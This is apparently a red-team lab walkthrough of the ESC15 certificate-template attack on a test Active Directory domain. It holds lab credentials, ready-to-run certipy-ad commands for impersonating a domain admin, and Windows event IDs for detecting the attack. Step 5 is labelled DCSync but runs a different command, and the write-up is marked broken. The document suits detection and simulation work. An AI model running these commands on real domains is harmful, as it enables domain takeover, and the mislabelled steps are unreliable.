# WT#062 — ESC15 (EKUwu): v1 Template Application Policy

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC15 (v1 schema) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, Certify |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC15` template published using v1 schema (Windows 2000)
- v1 templates use `msPKI-RA-Application-Policies` instead of `pKIExtendedKeyUsage`
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set in `msPKI-Certificate-Name-Flag`
- `analyst_dfir` has Enroll permission on `CADRE-ESC15`

## Attack Steps

### 1. Enumerate v1 template with Certify
```powershell
Certify.exe find /ca:dc01.cadre.local\cadre-CA /template:CADRE-ESC15
```

### 2. Verify Application Policies (not EKU)
```powershell
certipy-ad find -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
# Look for msPKI-RA-Application-Policies on CADRE-ESC15
```

### 3. Request certificate with DA UPN in SAN
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC15 -upn chief_command@cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 4. Authenticate as DA
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 5. DCSync
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local -ldap-shell
```

## Post-Exploitation Chain
ESC15 → v1 template Application Policy bypass → DA certificate → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: CADRE-ESC15 enrollment by analyst_dfir
- **Event 4889**: Certificate issued (v1 template with Application Policies)
- **Event 5136**: Directory service modification if template was edited
- **CA audit**: v1 schema template enrollment detected by `msPKI-Template-Schema-Version` = 1
## Status
BROKEN - Server 2025 PKI rejects v1 certificate templates
